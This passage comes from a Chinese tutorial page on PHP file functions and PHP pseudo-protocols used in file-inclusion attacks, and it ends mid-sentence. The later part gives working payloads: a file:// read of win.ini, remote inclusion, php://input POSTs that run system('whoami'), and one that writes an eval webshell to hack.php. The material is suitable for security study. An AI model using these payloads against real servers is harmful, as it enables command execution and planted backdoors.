2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">必需。规定要打开的文件或 URL。</td></tr><tr><td align="left">mode</td><td align="left">必需。规定您请求到该文件/流的访问类型。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#x27;1&#x27;。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><p><strong>mode属性选项：</strong></p><ul><li>&quot;r&quot; （只读方式打开，将文件指针指向文件头）</li><li>&quot;r+&quot; （读写方式打开，将文件指针指向文件头）</li><li>&quot;w&quot; （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）</li><li>&quot;w+&quot; （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）</li><li>&quot;a&quot; （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）</li><li>&quot;a+&quot; （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）</li><li>&quot;x&quot; （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）</li><li>&quot;x+&quot; （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</li></ul><blockquote><p>当书写一个文本文件时，请确保您使用了正确的行结束符！</p><p>在 Unix 系统中，行结束符为 \n；</p><p>在 Windows 系统中，行结束符为 \r\n；</p><p>在 Macintosh 系统中，行结束符为 \r。</p><p>Windows 系统中提供了一个文本转换标记 &quot;t&quot; ，可以透明地将 \n 转换为 \r\n。</p><p>您还可以使用 &quot;b&quot; 来强制使用二进制模式，这样就不会转换数据。为了使用这些标记，请使用 &quot;b&quot; 或者 &quot;t&quot; 来作为 mode 参数的最后一个字符。</p></blockquote><p><strong>实例</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="copy"><code>copy()</code><a class="hash-link" href="#copy" title="Direct link to heading">​</a></h5><ul><li><p>copy() 函数复制文件。</p></li><li><p><strong>该函数如果成功则返回 TRUE，如果失败则返回 FALSE。</strong></p></li></ul><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">copy(file,to_file)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">file</td><td align="left">必需。规定要复制的文件。</td></tr><tr><td align="left">to_file</td><td align="left">必需。规定复制文件的目的地。</td></tr></tbody></table><blockquote><p><strong>注释：</strong>如果目标文件已存在，将会被覆盖。</p></blockquote><h5 class="anchor anchorWithStickyNavbar_mojV" id="file_exists-"><code>file_exists() </code><a class="hash-link" href="#file_exists-" title="Direct link to heading">​</a></h5><p>file_exists() 函数检查文件或目录是否存在。</p><p>如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。</p><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">file_exists(path)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="filesize"><code>filesize()</code><a class="hash-link" href="#filesize" title="Direct link to heading">​</a></h5><p>filesize() 函数返回指定文件的大小。</p><p>如果成功，该函数返回文件大小的字节数。如果失败，则返回 FALSE。</p><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">filesize(filename)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p><strong>注释：</strong>该函数的结果会被缓存。请使用 clearstatcache() 来清除缓存。</p></blockquote><h5 class="anchor anchorWithStickyNavbar_mojV" id="stream_wrapper_register"><code>stream_wrapper_register()</code><a class="hash-link" href="#stream_wrapper_register" title="Direct link to heading">​</a></h5><ul><li>Register a URL wrapper implemented as a PHP class（注册一个url包装器以php类的形式）</li><li>成功则返回true，失败返回false</li></ul><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">bool stream_wrapper_register ( string protocol, string classname)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>allows you to implement your own protocol handlers and streams for use with all the other filesystem functions (such as <a href="https://www.365jz.com/handbook/php/function.fopen.html" target="_blank" rel="noopener noreferrer"><strong>fopen()</strong></a>, <a href="https://www.365jz.com/handbook/php/function.fread.html" target="_blank" rel="noopener noreferrer"><strong>fread()</strong></a> etc.).To implement a wrapper, you need to define a class with a number of member functions, as defined below. When someone fopens your stream, PHP will create an instance of classname and then call methods on that instance. You must implement the methods exactly as described below - doing otherwise will lead to undefined behaviour.</p><p>允许您实现自己的协议处理程序和流，以便与所有其他文件系统函数（例如<a href="https://www.365jz.com/handbook/php/function.fopen.html" target="_blank" rel="noopener noreferrer"><strong>fopen()</strong></a>、 <a href="https://www.365jz.com/handbook/php/function.fread.html" target="_blank" rel="noopener noreferrer"><strong>fread()</strong></a>等）一起使用。</p><p>要实现包装器，您需要定义一个具有多个成员函数的类，定义如下。当有人打开您的流时，PHP 将创建一个类名实例，然后调用该实例上的方法。您必须完全按照下面描述的方式实现这些方法 - 否则会导致未定义的行为。</p><blockquote><p>As of <code>PHP 5.0.0</code> the instance of <code>*classname*</code> will be populated with a <code>*context*</code> property referencing a <code>Context Resource</code> which may be accessed with <a href="https://www.365jz.com/handbook/php/function.stream-context-get-options.html" target="_blank" rel="noopener noreferrer"><strong>stream_context_get_options()</strong></a>. If no context was passed to the stream creation function, <code>*context*</code> will be set to <code>**NULL**</code>.</p></blockquote><h5 class="anchor anchorWithStickyNavbar_mojV" id="fputs"><code>fputs()</code><a class="hash-link" href="#fputs" title="Direct link to heading">​</a></h5><ul><li><p>fputs() 函数写入文件（可安全用于二进制文件）。</p></li><li><p>fputs() 函数是 <a href="https://www.w3school.com.cn/php/func_filesystem_fwrite.asp" target="_blank" rel="noopener noreferrer">fwrite()</a> 函数的别名。</p></li></ul><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fputs(file,string,length)</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>file</em></td><td align="left">必需。规定要写入的打开文件。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定要写入文件的字符串。</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定要写入的最大字节数。</td></tr></tbody></table><p><strong>说明</strong></p><blockquote><p>fwrite() 把 <em>string</em> 的内容写入文件指针 <em>file</em> 处。 如果指定了 <em>length</em>，当写入了 <em>length</em> 个字节或者写完了 <em>string</em> 以后，写入就会停止，视乎先碰到哪种情况。</p><p>fwrite() 返回写入的字符数，出现错误时则返回 false。</p></blockquote><p><strong>实例：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo fputs($file,&quot;Hello World. Testing!&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fclose($file);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_mojV" id="基本协议">基本协议<a class="hash-link" href="#基本协议" title="Direct link to heading">​</a></h4><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">file:// — 访问本地文件系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">http:// — 访问 HTTP(s) 网址</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ftp:// — 访问 FTP(s) URLs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">php:// — 访问各个输入/输出流（I/O streams）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">zlib:// — 压缩流</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data:// — 数据（RFC 2397）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">glob:// — 查找匹配的文件路径模式</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">phar:// — PHP 归档</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh2:// — Secure Shell 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rar:// — RAR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ogg:// — 音频流</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">expect:// — 处理交互式的流</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="file"><code>file://</code><a class="hash-link" href="#file" title="Direct link to heading">​</a></h5><p>file://伪协议用于访问服务器本地文件系统</p><p><strong>利用条件：</strong></p><ol><li>对allow_url_include不做要求。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">test.php?file=file://C:/Windows/win.ini</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="https"><code>http(s)://</code><a class="hash-link" href="#https" title="Direct link to heading">​</a></h5><ul><li>http(s)://协议用于从包含http(s)协议的网站获取当前网页的页面文件</li><li>常用于远程文件包含</li></ul><p><strong>利用条件：</strong></p><ol><li>对allow_url_include = on</li><li>对allow_url_fopen = on</li></ol><p><strong>语法</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">test.php?file=https://baidu.com</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="ftps"><code>ftp(s)://</code><a class="hash-link" href="#ftps" title="Direct link to heading">​</a></h5><ul><li>用于从网站中操作文件的上传和下载</li></ul><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">ftp://用户名:密码@IP地址或者域名:端口号</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>语法：</strong></p><h5 class="anchor anchorWithStickyNavbar_mojV" id="phpinput"><code>php://input</code><a class="hash-link" href="#phpinput" title="Direct link to heading">​</a></h5><ul><li><strong>可以访问请求的原始数据的只读流</strong>。</li><li>即可以直接读取到POST上没有经过解析的原始数据。 </li><li><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的。</li><li><code>$HTTP_RAW_POST_DATA</code>同样不读取<code>Content-Type为multipart/form-data</code>的数据</li><li>可以作为<code>$HTTP_RAW_POST_DATA</code>的替代</li><li>当使用此协议时<code>$HTTP_RAW_POST_DATA</code>默认没有填充</li><li>填入的长度，由<code>Coentent-Length</code>指定</li><li>只有<code>Content-Type为application/x-www-data-urlencoded时</code>，<strong>php://input</strong>数据才跟<strong>$_POST</strong>数据相一致</li><li>php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，<strong>且不需要特殊设置php.ini</strong></li></ul><p><strong>利用条件：</strong></p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li><li>配合POST数据包使用</li></ol><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=php://input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">POST:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php phpinfo(); ?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>原理：</strong></p><blockquote><p>为file变量进行赋值，使得include函数直接读取来自用户发送过去的POST数据包，进而实现操控php函数</p></blockquote><p><strong>案例：</strong></p><ul><li><p>碰到<code>file_get_contents()</code>就要想到用<code>php://input</code>绕过</p></li><li><p><code>file_get_contents()</code>：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。</p></li></ul><ul><li>除此之外，如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像<code>curl</code>命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面<code>php://input</code>可以将<strong>POST的数据读过来来赋值给参数</strong>。</li></ul><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo file_get_contents(&quot;php://input&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>网页会显示所有post过来的值</strong></p><h6 class="anchor anchorWithStickyNavbar_mojV" id="phpinput命令执行"><code>php://input（命令执行）</code><a class="hash-link" href="#phpinput命令执行" title="Direct link to heading">​</a></h6><p><strong>利用条件：</strong></p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=php://input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">POST:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php system(&#x27;whoami&#x27;); ?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h6 class="anchor anchorWithStickyNavbar_mojV" id="phpinput写入木马"><code>php://input（写入木马）</code><a class="hash-link" href="#phpinput写入木马" title="Direct link to heading">​</a></h6><p><strong>利用条件：</strong></p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><p><strong>语法：</strong></p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#393A34"><span class="token plain">fileinclude.php?file=php://input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">POST:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;);?&gt;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_mojV" id="phpfilter"><code>php://filter</code><a class="hash-link" href="#phpfilter" title="Direct link to heading">​</a></h5><ul><li><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对<strong>本地磁盘文件</strong>进行读写。</p></li><li><p>Filter 函数是 PHP 